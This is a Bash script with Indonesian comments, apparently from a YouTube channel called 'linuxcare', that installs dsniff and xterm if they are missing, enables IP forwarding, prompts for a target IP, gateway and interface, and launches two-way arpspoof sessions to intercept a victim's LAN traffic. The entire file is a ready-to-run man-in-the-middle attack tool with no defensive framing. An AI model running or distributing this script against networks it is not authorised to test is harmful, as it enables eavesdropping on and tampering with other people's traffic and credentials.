#!/bin/bash

#no-credit
#silahkan di edit sesuka hati selama tidak merusak fungsi

#color
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"

#variabel
lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
gateway=`route -n | grep 'Gateway' -A1 | tail -n1 | awk '{print $2}'`
#untuk scan client : ip route show | grep 'wlp3s0' -A3 | tail -n1 | awk '{print $1}'
interface=`ip addr | grep 'state UP' -A0 | awk '{print $2}' | cut -f1 -d':'`

clear
echo -e "$blue[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]"
echo -e "$blue[ $yellow                    LINUX-CARE  "$blue"                    ]"
echo -e "$blue[ $yellow                spoof your network  "$blue"                ]"
echo -e "$blue[ $red       --------------------------------------  "$blue"     ]"
echo -e "$blue[ $yellow                       visit      "$blue"                  ]"
echo -e "$blue[ $yellow          http://youtube.com/c/linuxcare     "$blue"       ]"
echo -e "$blue[<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<]"
echo

echo -ne "$red+$blue cek xterm......"
sleep 2
  if ! hash xterm 2>/dev/null; then
    echo -e "$red not installed"
    echo -ne "$blue+$green Installing"
    apt-get install xterm --yes
  else
    echo -e "$green installed !"
  fi
sleep 0.025
echo -ne "$red+$blue cek arpsoof...."
sleep 2
  if ! hash dsniff 2>/dev/null; then
    echo -e "$red not installed"
    echo -e "  Installing ..."
    xterm $HOLD -title "Installing arpspoof" -e apt-get --yes install dsniff
  sleep 1
  else
    echo -e "$green installed !"
  fi
sleep 2
echo
read -p "+ enable IP Forward ? (y/n): " answer
if [ $answer == y ];
then
  `echo 1 > /proc/sys/net/ipv4/ip_forward`
  echo
  sleep 1
  echo "+ IP Forward enable"
elif [ $answer == n ];
then
  `echo 0 > /proc/sys/net/ipv4/ip_forward`

  sleep 1
  echo "+ IP Forward disable"
else
    `echo 0 > /proc/sys/net/ipv4/ip_forward`

    sleep 1
    echo "+ IP Forward disable"
fi
sleep 2
echo
echo -e "$red+$blue IP Lokal  :"$yellow" $lanip"
echo -e "$red+$blue IP gateway:"$yellow" $gateway"
echo -e "$red+$blue Interface :"$yellow" $interface"
echo
echo
echo -ne "$red+$blue masukan IP target  : "$yellow""
read ipt
echo -ne "$red+$blue masukan IP gateway : "$yellow""
read ipg
echo -ne "$red+$blue masukan interface  : "$yellow""
read iface
sleep 2
echo
echo
echo -e "$yellow+ Tekan CTRL+C setelah selesai ....."$transparent""

xterm $HOLD -title "spoofing $ipt to $ipg" -e arpspoof -i $iface -t $ipt $ipg &
xterm $HOLD -title "spoofing $ipg to $ipt" -e arpspoof -i $iface -t $ipg $ipt
clear
